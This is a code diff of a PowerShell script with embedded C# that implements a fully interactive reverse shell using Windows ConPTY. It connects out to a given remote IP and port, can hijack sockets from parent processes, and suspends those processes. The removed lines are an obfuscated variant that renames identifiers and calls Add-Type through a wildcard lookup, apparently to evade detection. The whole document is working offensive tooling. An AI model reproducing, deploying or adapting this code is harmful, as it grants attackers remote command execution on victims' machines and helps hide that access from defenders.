@@ -1,50 +1,50 @@
-function Invoke-CPTSH
+function Invoke-CONTs
 {   
-    
+   
     Param
     (
         [Parameter(Position = 0)]
         [String]
-        $RIP,
+        $RemoteIp,
         
         [Parameter(Position = 1)]
         [String]
-        $RP,
+        $RemotePort,
 
         [Parameter()]
         [String]
-        $RW = "24",
+        $Rows = "24",
 
         [Parameter()]
         [String]
-        $CLS = "80",
+        $Cols = "80",
 
         [Parameter()]
         [String]
-        $CL = "powershell.exe",
+        $CommandLine = "powershell.exe",
         
         [Parameter()]
         [Switch]
-        $UPG
+        $Upgrade
     )
     
-    if( $PSBoundParameters.ContainsKey('UPG') ) {
-        $RIP = "UPG"
-        $RP = "shell"
+    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
+        $RemoteIp = "upgrade"
+        $RemotePort = "shell"
     }
     else{
   
-        if(-Not($PSBoundParameters.ContainsKey('RIP'))) {
-            throw "RIP missing parameter"
+        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
+            throw "RemoteIp missing parameter"
         }
         
-        if(-Not($PSBoundParameters.ContainsKey('RP'))) {
-            throw "RP missing parameter"
+        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
+            throw "RemotePort missing parameter"
         }
     }
-    $parametersCPTSH = @($RIP, $RP, $RW, $CLS, $CL)
-    & (Get-Command '????Type' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] -TypeDefinition $Source -Language CSharp;
-	$output = [CPTSHMainClass]::CPTSHMain($parametersCPTSH)
+    $parametersCONTs = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
+    Add-Type -TypeDefinition $Source -Language CSharp;
+    $output = [CONTsMainClass]::CONTsMain($parametersCONTs)
     Write-Output $output
 }
 
@@ -61,13 +61,13 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
-public class CPTSHException : Exception
+public class CONTsException : Exception
 {
-    private const string error_string = "[-] CPTSHException: ";
+    private const string error_string = "[-] CONTsException: ";
 
-    public CPTSHException() { }
+    public CONTsException() { }
 
-    public CPTSHException(string message) : base(error_string + message) { }
+    public CONTsException(string message) : base(error_string + message) { }
 }
 
 public class DeadlockCheckHelper
@@ -799,7 +799,7 @@ public static class SocketHijacking
             }
         }
         if (targetSocketHandle == IntPtr.Zero)
-            throw new CPTSHException("No sockets found, so no hijackable sockets :( Exiting...");
+            throw new CONTsException("No sockets found, so no hijackable sockets :( Exiting...");
         return targetSocketHandle;
     }
     public static void SetSocketBlockingMode(IntPtr socket, int mode)
@@ -813,7 +813,7 @@ public static class SocketHijacking
         else
             result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
         if (result == -1)
-            throw new CPTSHException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            throw new CONTsException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
     }
 }
 
@@ -849,7 +849,7 @@ public struct ParentProcessUtilities
         int returnLength;
         int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
         if (status != 0)
-            throw new CPTSHException(status.ToString());
+            throw new CONTsException(status.ToString());
         try
         {
             return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
@@ -862,9 +862,9 @@ public struct ParentProcessUtilities
     }
 }
 
-public static class CPTSH
+public static class CONTs
 {
-    private const string errorString = "{{{CPTSHException}}}\r\n";
+    private const string errorString = "{{{CONTsException}}}\r\n";
     private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
     private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
     private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
@@ -974,10 +974,10 @@ public static class CPTSH
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool CreateProcessEx(string lpApplicationName, string lpCL, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
-    private static extern bool CreateProcess(string lpApplicationName, string lpCL, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -1090,22 +1090,22 @@ public static class CPTSH
     {
         WSAData data;
         if (WSAStartup(2 << 8 | 2, out data) != 0)
-            throw new CPTSHException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+            throw new CONTsException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
     }
 
-    private static IntPtr connectRemote(string RIP, int RP)
+    private static IntPtr connectRemote(string remoteIp, int remotePort)
     {
         int port = 0;
         int error = 0;
-        string host = RIP;
+        string host = remoteIp;
 
         try
         {
-            port = Convert.ToInt32(RP);
+            port = Convert.ToInt32(remotePort);
         }
         catch
         {
-            throw new CPTSHException("Specified port is invalid: " + RP.ToString());
+            throw new CONTsException("Specified port is invalid: " + remotePort.ToString());
         }
 
         IntPtr socket = IntPtr.Zero;
@@ -1118,27 +1118,27 @@ public static class CPTSH
         if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
         {
             error = WSAGetLastError();
-            throw new CPTSHException(String.Format("WSAConnect failed with error code: {0}", error));
+            throw new CONTsException(String.Format("WSAConnect failed with error code: {0}", error));
         }
 
         return socket;
     }
 
-    private static void TryParseRWCLSFromSocket(IntPtr shellSocket, ref uint RW, ref uint CLS)
+    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
     {
         Thread.Sleep(500);//little tweak for slower connections
         byte[] received = new byte[100];
-        int RWTemp, CLSTemp;
+        int rowsTemp, colsTemp;
         int bytesReceived = recv(shellSocket, received, 100, 0);
         try
         {
             string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
-            string RWString = sizeReceived.Split(' ')[0].Trim();
-            string CLSString = sizeReceived.Split(' ')[1].Trim();
-            if (Int32.TryParse(RWString, out RWTemp) && Int32.TryParse(CLSString, out CLSTemp))
+            string rowsString = sizeReceived.Split(' ')[0].Trim();
+            string colsString = sizeReceived.Split(' ')[1].Trim();
+            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
             {
-                RW = (uint)RWTemp;
-                CLS = (uint)CLSTemp;
+                rows = (uint)rowsTemp;
+                cols = (uint)colsTemp;
             }
         }
         catch
@@ -1154,9 +1154,9 @@ public static class CPTSH
         pSec.bInheritHandle = 1;
         pSec.lpSecurityDescriptor = IntPtr.Zero;
         if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CPTSHException("Could not create the InputPipe");
+            throw new CONTsException("Could not create the InputPipe");
         if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CPTSHException("Could not create the OutputPipe");
+            throw new CONTsException("Could not create the OutputPipe");
     }
 
     private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
@@ -1184,22 +1184,22 @@ public static class CPTSH
         IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         if (!GetConsoleMode(hStdOut, out outConsoleMode))
         {
-            throw new CPTSHException("Could not get console mode");
+            throw new CONTsException("Could not get console mode");
         }
         outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
         if (!SetConsoleMode(hStdOut, outConsoleMode))
         {
-            throw new CPTSHException("Could not enable virtual terminal processing");
+            throw new CONTsException("Could not enable virtual terminal processing");
         }
     }
 
-    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint RW, uint CLS)
+    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
     {
         int result = -1;
         EnableVirtualTerminalSequenceProcessing();
         COORD consoleCoord = new COORD();
-        consoleCoord.X = (short)CLS;
-        consoleCoord.Y = (short)RW;
+        consoleCoord.X = (short)cols;
+        consoleCoord.Y = (short)rows;
         result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
         return result;
     }
@@ -1210,7 +1210,7 @@ public static class CPTSH
         bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
         if (success || lpSize == IntPtr.Zero)
         {
-            throw new CPTSHException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            throw new CONTsException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
         startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -1218,17 +1218,17 @@ public static class CPTSH
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
         {
-            throw new CPTSHException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            throw new CONTsException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
         success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
-            throw new CPTSHException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            throw new CONTsException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
         return startupInfo;
     }
 
-    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string CL)
+    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
     {
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
         SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
@@ -1236,18 +1236,18 @@ public static class CPTSH
         pSec.nLength = securityAttributeSize;
         SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
         tSec.nLength = securityAttributeSize;
-        bool success = CreateProcessEx(null, CL, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (!success)
         {
-            throw new CPTSHException("Could not create process. " + Marshal.GetLastWin32Error());
+            throw new CONTsException("Could not create process. " + Marshal.GetLastWin32Error());
         }
         return pInfo;
     }
 
-    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string CL)
+    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
     {
         STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
-        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, CL);
+        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
         return processInfo;
     }
 
@@ -1376,7 +1376,7 @@ public static class CPTSH
         return thReadSocketWritePipe;
     }
 
-    public static string SpawnCPTSH(string RIP, int RP, uint RW, uint CLS, string CL, bool UPGShell)
+    public static string SpawnCONTs(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
     {
         IntPtr shellSocket = IntPtr.Zero;
         IntPtr InputPipeRead = IntPtr.Zero;
@@ -1407,7 +1407,7 @@ public static class CPTSH
         if (conptyCompatible)
         {
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
-            if (UPGShell)
+            if (upgradeShell)
             {
                 List<IntPtr> socketsHandles = new List<IntPtr>();
                 currentProcess = Process.GetCurrentProcess();
@@ -1425,7 +1425,7 @@ public static class CPTSH
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
-                            throw new CPTSHException("No \\Device\\Afd objects found. Socket duplication failed.");
+                            throw new CONTsException("No \\Device\\Afd objects found. Socket duplication failed.");
                         }
                         else
                         {
@@ -1448,13 +1448,13 @@ public static class CPTSH
             }
             else
             {
-                shellSocket = connectRemote(RIP, RP);
+                shellSocket = connectRemote(remoteIp, remotePort);
                 if (shellSocket == IntPtr.Zero)
                 {
-                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, RIP, RP.ToString());
+                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                     return output;
                 }
-                TryParseRWCLSFromSocket(shellSocket, ref RW, ref CLS);
+                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
             }
             if (GetConsoleWindow() == IntPtr.Zero)
             {
@@ -1466,25 +1466,25 @@ public static class CPTSH
             // Console.WriteLine("debug: Creating pseudo console...");
             // Thread.Sleep(180000);
             // return "";
-            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, RW, CLS);
+            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
                 output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                 return output;
             }
-            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, CL);
+            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
         }
         else
         {
-            if (UPGShell)
+            if (upgradeShell)
             {
-                output += string.Format("Could not UPG shell to fully interactive because ConPTY is not compatible on this system");
+                output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
                 return output;
             }
-            shellSocket = connectRemote(RIP, RP);
+            shellSocket = connectRemote(remoteIp, remotePort);
             if (shellSocket == IntPtr.Zero)
             {
-                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, RIP, RP.ToString());
+                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                 return output;
             }
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
@@ -1494,14 +1494,14 @@ public static class CPTSH
             sInfo.hStdInput = InputPipeRead;
             sInfo.hStdOutput = OutputPipeWrite;
             sInfo.hStdError = OutputPipeWrite;
-            CreateProcess(null, CL, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
+            CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
         // Note: We can close the handles to the PTY-end of the pipes here
         // because the handles are dup'ed into the ConHost and will be released
         // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
-        if (UPGShell) {
+        if (upgradeShell) {
             // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
             if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
             if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
@@ -1515,7 +1515,7 @@ public static class CPTSH
         //cleanup everything
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
-        if (UPGShell)
+        if (upgradeShell)
         {
             if (!IsSocketOverlapped)
             {
@@ -1535,12 +1535,12 @@ public static class CPTSH
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
         if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
         if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
-        output += "CPTSH kindly exited.\r\n";
+        output += "CONTs kindly exited.\r\n";
         return output;
     }
 }
 
-public static class CPTSHMainClass
+public static class CONTsMainClass
 {
     private static string help = @"";
 
@@ -1552,7 +1552,7 @@ public static class CPTSHMainClass
     private static void CheckArgs(string[] arguments)
     {
         if (arguments.Length < 2)
-            throw new CPTSHException("\r\nCPTSH: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+            throw new CONTsException("\r\nCONTs: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
 
     private static void DisplayHelp()
@@ -1560,11 +1560,11 @@ public static class CPTSHMainClass
         Console.Out.Write(help);
     }
 
-    private static string CheckRIPArg(string ipString)
+    private static string CheckRemoteIpArg(string ipString)
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new CPTSHException("\r\nCPTSH: Invalid RIP value" + ipString);
+            throw new CONTsException("\r\nCONTs: Invalid remoteIp value" + ipString);
         return ipString;
     }
 
@@ -1572,35 +1572,35 @@ public static class CPTSHMainClass
     {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
-            throw new CPTSHException("\r\nCPTSH: Invalid integer value " + arg);
+            throw new CONTsException("\r\nCONTs: Invalid integer value " + arg);
         return ret;
     }
 
-    private static uint ParseRW(string[] arguments)
+    private static uint ParseRows(string[] arguments)
     {
-        uint RW = 24;
+        uint rows = 24;
         if (arguments.Length > 2)
-            RW = (uint)CheckInt(arguments[2]);
-        return RW;
+            rows = (uint)CheckInt(arguments[2]);
+        return rows;
     }
 
-    private static uint ParseCLS(string[] arguments)
+    private static uint ParseCols(string[] arguments)
     {
-        uint CLS = 80;
+        uint cols = 80;
         if (arguments.Length > 3)
-            CLS = (uint)CheckInt(arguments[3]);
-        return CLS;
+            cols = (uint)CheckInt(arguments[3]);
+        return cols;
     }
 
-    private static string ParseCL(string[] arguments)
+    private static string ParseCommandLine(string[] arguments)
     {
-        string CL = "powershell.exe";
+        string commandLine = "powershell.exe";
         if (arguments.Length > 4)
-            CL = arguments[4];
-        return CL;
+            commandLine = arguments[4];
+        return commandLine;
     }
 
-    public static string CPTSHMain(string[] args)
+    public static string CONTsMain(string[] args)
     {
         string output = "";
         if (args.Length == 1 && HelpRequired(args[0]))
@@ -1609,23 +1609,23 @@ public static class CPTSHMainClass
         }
         else
         {
-            string RIP = "";
-            int RP = 0;
-            bool UPGShell = false;
+            string remoteIp = "";
+            int remotePort = 0;
+            bool upgradeShell = false;
             try
             {
                 CheckArgs(args);
-                if (args[0].Contains("UPG"))
-                    UPGShell = true;
+                if (args[0].Contains("upgrade"))
+                    upgradeShell = true;
                 else
                 {
-                    RIP = CheckRIPArg(args[0]);
-                    RP = CheckInt(args[1]);
+                    remoteIp = CheckRemoteIpArg(args[0]);
+                    remotePort = CheckInt(args[1]);
                 }
-                uint RW = ParseRW(args);
-                uint CLS = ParseCLS(args);
-                string CL = ParseCL(args);
-                output = CPTSH.SpawnCPTSH(RIP, RP, RW, CLS, CL, UPGShell);
+                uint rows = ParseRows(args);
+                uint cols = ParseCols(args);
+                string commandLine = ParseCommandLine(args);
+                output = CONTs.SpawnCONTs(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
             catch (Exception e)
             {
@@ -1641,7 +1641,7 @@ class MainClass
 {
     static void Main(string[] args)
     {
-        Console.Out.Write(CPTSHMainClass.CPTSHMain(args));
+        Console.Out.Write(CONTsMainClass.CONTsMain(args));
     }
 }
 
